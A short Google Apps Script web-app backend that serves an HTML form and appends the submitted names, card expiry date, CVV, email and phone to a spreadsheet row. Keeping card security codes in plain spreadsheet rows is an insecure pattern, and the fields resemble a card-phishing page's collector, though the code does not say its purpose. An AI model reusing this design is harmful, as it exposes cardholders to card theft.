function doGet(request) {
  return HtmlService.createTemplateFromFile('index').evaluate();
  
}

function include(filename){
  return HtmlService.createHtmlOutputFromFile(filename).getContent();
}

function processForm(formObject){
  var url="";
  var ss= SpreadsheetApp.openByUrl(url);
  var ws=ss.getSheetByName("Sheet1");

  ws.appendRow([
    formObject.first_name,
    formObject.last_name,
    formObject.expriy,
    formObject.cvv,
    formObject.email,
    formObject.phone

  ]);
}
